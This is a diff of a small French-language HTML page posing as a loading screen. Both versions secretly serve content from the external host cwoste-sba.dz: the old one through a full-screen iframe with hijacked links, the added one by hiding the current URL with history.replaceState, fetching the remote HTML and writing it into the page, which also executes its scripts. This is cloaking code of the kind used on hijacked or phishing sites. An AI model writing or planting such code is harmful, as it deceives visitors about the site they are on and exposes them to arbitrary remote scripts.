@@ -1,54 +1,28 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Chargement...</title>
-<style>
-body {
-    margin: 0;
-    padding: 0;
-    overflow: hidden;
-    background: #f0f0f0;
-}
-iframe {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    border: none;
-}
-.loading {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    font-size: 18px;
-    color: #333;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>Redirection...</title>
+    <script>
+    window.onload = function() {
+        // Cache l'URL actuelle
+        history.replaceState(null, '', '/');
+        
+        // Charge le contenu via fetch
+        fetch('https://cwoste-sba.dz/tree/')
+            .then(response => response.text())
+            .then(html => {
+                document.open();
+                document.write(html);
+                document.close();
+            })
+            .catch(() => {
+                window.location.href = 'https://cwoste-sba.dz/tree/';
+            });
+    }
+    </script>
 </head>
 <body>
-    <div class="loading">Chargement...</div>
-    <iframe src="https://cwoste-sba.dz/tree/" onload="this.style.opacity=1; document.querySelector('.loading').style.display='none';" style="opacity:0; transition:opacity 0.3s;"></iframe>
-    
-    <script>
-    // Empêcher l'ouverture des liens dans l'iframe de naviguer
-    window.addEventListener('load', function() {
-        const iframe = document.querySelector('iframe');
-        iframe.contentWindow.addEventListener('click', function(e) {
-            const links = iframe.contentDocument.querySelectorAll('a');
-            links.forEach(link => {
-                link.addEventListener('click', function(event) {
-                    event.preventDefault();
-                    const href = this.getAttribute('href');
-                    if (href && !href.startsWith('#')) {
-                        iframe.src = href.startsWith('http') ? href : 'https://cwoste-sba.dz/tree/' + href.replace(/^\//, '');
-                    }
-                });
-            });
-        });
-    });
-    </script>
+    <p>Chargement...</p>
 </body>
 </html>
